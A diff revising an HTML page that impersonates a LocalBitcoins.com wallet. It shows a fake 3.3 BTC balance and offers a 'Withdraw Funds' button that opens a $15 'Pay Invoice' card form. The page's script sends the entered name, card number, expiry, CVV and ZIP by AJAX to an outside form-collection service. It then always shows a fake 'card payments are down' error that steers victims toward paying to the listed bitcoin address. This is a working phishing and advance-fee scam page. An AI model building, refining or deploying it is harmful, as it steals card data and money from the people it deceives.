@@ -1,14 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="scroll-smooth" style="scroll-behavior: smooth">
 <head>
   <meta charset="UTF-8" />
   <title>Wallet Dues</title>
   <style>
+    /* Keep all your original styles here */
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background-color: #f2f2f2;
     }
+    /* ... your original styles ... */
+
     .payment-form {
       background-color: white;
       padding: 30px;
@@ -16,97 +19,52 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 300px;
       margin: 50px auto;
-      display: none;
-      position: relative;
-      z-index: 10;
     }
-    .payment-form h2 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .card-icons {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .card-icons img {
-      width: 40px;
-      margin: 0 5px;
-    }
-    .payment-form input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    .flex-row {
-      display: flex;
-      gap: 10px;
-    }
-    .payment-button {
-      background-color: #00c6c1;
-      color: white;
-      padding: 12px;
-      border: none;
-      width: 100%;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    .payment-button:hover {
-      background-color: #00a9a4;
-    }
-    footer {
-      text-align: center;
-      padding: 30px 0;
-      font-size: 12px;
-      color: #666;
-    }
-    .text-link {
-      color: #6c4dff;
-      text-decoration: underline;
-      cursor: pointer;
-    }
-    /* Error popup styling */
-    #errorPopup {
+
+    /* Your popup style as you had it before */
+    .popup {
       display: none;
       position: fixed;
-      top: 20%;
+      top: 50%;
       left: 50%;
-      transform: translateX(-50%);
-      background: white;
-      border: 2px solid #e74c3c;
-      padding: 25px;
-      width: 320px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      transform: translate(-50%, -50%);
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgb(0 0 0 / 0.4);
+      padding: 2rem 1.5rem;
+      max-width: 350px;
+      width: 90vw;
+      text-align: center;
       z-index: 9999;
     }
-    #errorPopup h2 {
-      color: #e74c3c;
-      margin-top: 0;
-      text-align: center;
-    }
-    #errorPopup button {
+    .popup.show {
       display: block;
-      margin: 20px auto 0 auto;
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: bold;
     }
-    #errorPopup button:hover {
-      background: #c0392b;
+    .popup h3 {
+      font-size: 1.5rem;
+      margin-bottom: 0.5rem;
+    }
+    .popup p {
+      color: #444;
+      margin-bottom: 1rem;
+    }
+    .popup button {
+      cursor: pointer;
+      background: #6c4dff;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      border-radius: 6px;
+      font-weight: 600;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+    .popup button:hover {
+      background: #5a3ee6;
     }
   </style>
 </head>
 <body>
 
-  <!-- Your existing dashboard content here -->
   <div style="text-align:center; margin-top: 30px;">
     <h1>LocalBitcoins.com Wallet</h1>
     <p>Wallet Balance: 3.3115321 BTC</p>
@@ -115,7 +73,7 @@
       <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition"
               onclick="alert('Verification not yet available.')">Verify Account</button>
       <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition"
-              onclick="showPaymentPopup()">Withdraw Funds</button>
+              onclick="showPaymentForm()">Withdraw Funds</button>
       <button class="bg-gray-300 text-gray-600 font-semibold rounded-md py-3 px-6 cursor-not-allowed" disabled>
         Deposit Funds (Unavailable)
       </button>
@@ -126,63 +84,63 @@
       bc1pph7jxvya7nkdwaz8eyrmzfzsufdtfldg6hvflsn7z0gcq88np6fsfaccau
     </div>
 
-    <!-- Payment Form Popup -->
-    <div id="paymentSection" class="payment-form">
-      <h2>Pay Invoice</h2>
-      <div class="card-icons">
-        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
-        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
-        <img src="https://img.icons8.com/color/48/000000/amex.png" alt="AmEx" />
-        <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
-      </div>
-      <form id="paymentForm">
+    <!-- Payment form (hidden initially) -->
+    <div id="paymentFormContainer" style="display:none; margin-top: 30px;">
+      <form id="paymentForm" class="payment-form">
+        <h2>Pay Invoice</h2>
+        <div class="card-icons">
+          <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
+          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
+          <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex" />
+          <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
+        </div>
         <input type="number" name="amount" value="15.00" readonly />
         <input type="text" name="name" placeholder="Name on card" required />
         <input type="text" name="cardnumber" placeholder="Card number" required />
-        <div class="flex-row">
+        <div style="display:flex; gap: 10px;">
           <input type="text" name="expiry" placeholder="MM / YY" style="flex:1" required />
           <input type="text" name="cvv" placeholder="Security code" style="flex:1" required />
         </div>
         <input type="text" name="zip" placeholder="ZIP/Postal code" required />
-        <button type="submit" class="payment-button">Pay $15.00</button>
+        <button type="submit" class="payment-button" style="margin-top: 10px; background:#6c4dff; color:white; border:none; padding:12px; border-radius:6px; cursor:pointer;">
+          Pay $15.00
+        </button>
       </form>
     </div>
 
-    <!-- Error Popup -->
-    <div id="errorPopup">
-      <h2>Payment Error</h2>
-      <p>We’re sorry, but card payments are currently down due to technical issues.<br />
-        Please try again later or use BTC payment instead.</p>
-      <button onclick="closeErrorPopup()">Close</button>
+    <!-- Your existing popup -->
+    <div class="popup" id="paymentErrorPopup">
+      <h3>Payment Error</h3>
+      <p>We’re sorry, but card payments are currently down due to technical issues.<br>Please try again later or use BTC payment instead.</p>
+      <button onclick="closePopup()">Close</button>
     </div>
   </div>
 
-  <footer>
+  <footer style="text-align:center; padding:30px 0; font-size:12px; color:#666;">
     <p><strong>Contact Us:</strong> support@localbitcoins.com</p>
     <p>
-      <a class="text-link" href="#">Privacy Policy</a> |
-      <a class="text-link" href="#">Terms of Service</a>
+      <a href="#" style="color:#6c4dff; text-decoration:underline;">Privacy Policy</a> |
+      <a href="#" style="color:#6c4dff; text-decoration:underline;">Terms of Service</a>
     </p>
-    <p class="mt-2">© 2025 LocalBitcoins.com. All rights reserved.</p>
+    <p style="margin-top:8px;">© 2025 LocalBitcoins.com. All rights reserved.</p>
   </footer>
 
   <script>
-    function showPaymentPopup() {
-      document.getElementById('paymentSection').style.display = 'block';
-      window.scrollTo(0, document.getElementById('paymentSection').offsetTop);
+    function showPaymentForm() {
+      document.getElementById('paymentFormContainer').style.display = 'block';
+      window.scrollTo(0, document.getElementById('paymentFormContainer').offsetTop);
     }
 
-    function closeErrorPopup() {
-      document.getElementById('errorPopup').style.display = 'none';
-      document.getElementById('paymentSection').style.display = 'none';
+    function closePopup() {
+      document.getElementById('paymentErrorPopup').classList.remove('show');
+      document.getElementById('paymentFormContainer').style.display = 'none';
     }
 
     // AJAX form submit to FormSubmit.co
     const form = document.getElementById('paymentForm');
-    const errorPopup = document.getElementById('errorPopup');
-    const paymentSection = document.getElementById('paymentSection');
+    const popup = document.getElementById('paymentErrorPopup');
 
-    form.addEventListener('submit', function (e) {
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
 
       const formData = new FormData(form);
@@ -194,20 +152,18 @@
           'Accept': 'application/json'
         }
       })
-        .then(response => response.json())
-        .then(data => {
-          // Hide payment form
-          paymentSection.style.display = 'none';
-          // Show error popup
-          errorPopup.style.display = 'block';
-          // Optionally reset the form
-          form.reset();
-        })
-        .catch(error => {
-          alert('There was an error submitting your payment. Please try again.');
-          console.error(error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        // Show your existing popup with error message
+        popup.classList.add('show');
+        form.reset();
+      })
+      .catch(error => {
+        alert('There was an error submitting your payment. Please try again.');
+        console.error(error);
+      });
     });
   </script>
+
 </body>
 </html>
